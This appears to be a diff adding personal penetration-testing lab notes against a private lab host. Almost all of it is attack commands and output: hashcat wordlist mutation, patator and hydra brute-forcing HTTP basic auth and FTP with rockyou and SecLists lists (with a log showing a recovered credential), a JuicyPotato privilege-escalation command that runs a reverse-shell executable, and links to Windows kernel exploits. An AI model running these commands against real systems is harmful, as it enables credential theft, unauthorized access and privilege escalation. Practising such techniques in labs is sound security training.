@@ -1,0 +1,24 @@
+hashcat --force /home/george93/user.txt -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words.txt
+patator http_fuzz auth_type=basic url=http://192.168.97.46:242/ user_pass=FILE0:FILE1 0=/home/george93/user_.txt 1=/home/george93/pass.txt -x ignore:code=401
+patator http_fuzz auth_type=basic url=http://192.168.97.46:242/ user_pass=FILE0:FILE1 0=/home/george93/user_hash.txt 1=/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -x ignore:code=401
+patator http_fuzz auth_type=basic url=http://192.168.97.46:242/ user_pass=FILE0:FILE1 0=/home/george93/user_hash.txt 1=/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -x ignore:code=401
+19:43:02 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.9 at 2022-03-12 19:43 +08
+19:43:02 patator    INFO -                                                                              
+19:43:02 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:43:02 patator    INFO - -----------------------------------------------------------------------------
+19:53:45 patator    INFO - 200  243:76         0.168 | offsec:elite                       | 35098 | HTTP/1.1 200 OK
+^C^C19:55:06 patator    INFO - Hits/Done/Skip/Fail/Size: 1/39908/0/0/2310000, Avg: 55 r/s, Time: 0h 12m 3s
+19:55:06 patator    INFO - To resume execution, pass --resume 3998,3983,3990,4002,4000,3986,3988,3976,3997,3988
+
+
+
+hydra -L /home/george93/user.txt -P /usr/share/wordlists/rockyou.txt 192.168.97.46 -t 4 ftp
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.97.46 -t 4 ftp -I
+
+
+Juicy.Potato.x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\apache\Desktop\reverse.exe" -t *
+
+can use the following kernel exploits as well:
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120
+https://www.exploit-db.com/exploits/40564
